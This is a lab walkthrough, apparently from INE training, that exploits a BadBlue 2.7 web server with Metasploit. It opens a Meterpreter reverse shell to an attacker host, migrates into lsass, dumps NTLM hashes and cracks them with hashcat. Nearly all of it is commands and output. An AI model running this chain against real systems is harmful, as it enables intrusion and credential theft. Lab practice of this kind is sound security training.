# Dumping & Cracking NTLM Hashes

Exploitation
```bash
└─# nmap demo.ine.local -sV -p 80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-30 09:39 IST
Nmap scan report for demo.ine.local (10.0.30.196)
Host is up (0.0032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

└─# searchsploit Badblue
---------------------------------------- ---------------------------------
 Exploit Title                          |  Path
---------------------------------------- ---------------------------------
BadBlue 2.5 - 'ext.dll' Remote Buffer O | windows/remote/16761.rb
BadBlue 2.5 - Easy File Sharing Remote  | windows/remote/845.c
BadBlue 2.52 Web Server - Multiple Conn | windows/dos/419.pl
BadBlue 2.55 - Web Server Remote Buffer | windows/remote/847.cpp
BadBlue 2.72 - PassThru Remote Buffer O | windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilitie | windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflo | windows/remote/16806.rb
Working Resources 1.7.3 BadBlue - Null  | windows/remote/21616.txt
Working Resources 1.7.x BadBlue - Admin | windows/remote/21630.html
~~~~

msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.22.64
RHOSTS => 10.0.22.64
msf6 exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 10.10.38.4:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (176198 bytes) to 10.0.22.64
[*] Meterpreter session 1 opened (10.10.38.4:4444 -> 10.0.22.64:49238) at 2025-07-30 09:54:57 +0530

meterpreter > 
```

Local Enumeration
```bash
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

Hash Dumping & Cracking prep
```bash
meterpreter > pgrep lsass
692
meterpreter > migrate 692
[*] Migrating from 2760 to 692...
[*] Migration completed successfully.

# Get hashes
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Quick check that I got all user's hash
meterpreter > shell
Process 2968 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            bob                      Guest                    
The command completed with one or more errors.


# Create text file with Administrator and bob hashes
└─# vim hashes.txt

└─# cat vim hashes.txt
cat: vim: No such file or directory
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
```

Cracking hashes with hashcat
```bash
└─# hashcat -a3 -m 1000 hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting


8846f7eaee8fb117ad06bdd830b7586c:password                 
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: hashes.txt
Time.Started.....: Wed Jul 30 10:52:15 2025 (0 secs)
Time.Estimated...: Wed Jul 30 10:52:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: password [8]
Guess.Queue......: 4/14336793 (0.00%)
Speed.#1.........:     1130 H/s (0.04ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: password -> password



5835048ce94ad0564e29a924a03510ef:password1                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: hashes.txt
Time.Started.....: Wed Jul 30 10:52:17 2025 (0 secs)
Time.Estimated...: Wed Jul 30 10:52:17 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: password1 [9]
Guess.Queue......: 28/14336793 (0.00%)
Speed.#1.........:      941 H/s (0.04ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: password1 -> password1
```
